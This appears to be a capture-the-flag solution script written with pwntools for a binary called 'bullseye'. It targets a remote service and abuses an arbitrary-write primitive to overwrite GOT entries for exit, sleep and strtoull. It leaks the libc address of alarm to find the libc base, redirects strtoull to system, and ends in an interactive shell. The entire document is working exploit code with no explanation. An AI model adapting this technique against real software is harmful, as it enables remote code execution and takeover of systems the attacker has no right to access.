#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("bullseye")
libc = ELF("libc6_2.30-0ubuntu2.2_amd64.so")
ld = ELF("./ld-2.30.so")

context.binary = exe


def conn():
    return process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})

def mov(where, what):
    p.recvuntil("Where do you want to write to?\n")
    p.sendline(hex(where))

    p.recvuntil("What do you want to write?\n")
    p.sendline(hex(what))

ret = 0x040125f
#p = conn()
p = remote('jh2i.com', 50031)

mov(exe.got["exit"], exe.sym['main'])
mov(exe.got["sleep"], ret)

alarm = int( p.recvline().strip() ,16)
print("Alarm => " , hex(alarm))
libc_base = alarm - libc.sym['alarm']
log.info("Libc base @ 0x%x", libc_base)


pause()
mov(exe.got['strtoull'], libc_base + libc.sym['system'])
sleep(1)
p.sendline("sh")
p.interactive()
